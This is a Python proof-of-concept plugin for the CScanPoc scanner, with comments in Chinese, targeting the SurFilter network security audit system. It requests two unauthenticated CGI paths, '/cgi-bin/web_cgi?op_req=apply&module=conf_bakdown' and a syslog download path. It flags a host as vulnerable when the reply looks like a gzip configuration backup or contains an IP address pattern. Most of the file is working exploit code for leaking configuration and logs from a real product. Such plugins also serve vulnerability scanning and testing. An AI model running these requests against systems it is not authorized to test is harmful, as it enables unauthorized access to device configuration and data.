# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urlparse
import re
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'SurFilter_0000' # 平台漏洞编号，留空
    name = '任子行网络安全审计系统任意命令执行&未授权下载配置文件' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2015-06-18'  # 漏洞公布时间
    desc = '''
        任子行网络安全审计系统任意命令执行&未授权下载配置文件。
        '/cgi-bin/web_cgi?op_req=apply&module=conf_bakdown',
        '/cgi-bin/web_cgi?op_req=apply&module=syslog_management&opt=down&type=system'
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0102009
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = '任子行网络安全审计系统'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '719e1a4b-e9dd-40e4-8631-5b37bc6172bb'
    author = '国光'  # POC编写者
    create_date = '2018-05-12' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payloads = (
                '/cgi-bin/web_cgi?op_req=apply&module=conf_bakdown',
                '/cgi-bin/web_cgi?op_req=apply&module=syslog_management&opt=down&type=system'
            )
            for payload in payloads:
                url = '{target}'.format(target=self.target)+payload
                code, head,res, errcode, _ = hh.http(url)
                if code == 200 and res.startswith("\x1F\x8B\x08\x00"):
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
                elif code == 200 and re.search(r"\d+\.\d+\.\d+\.\d+@",res):
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
                else:
                    pass
        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()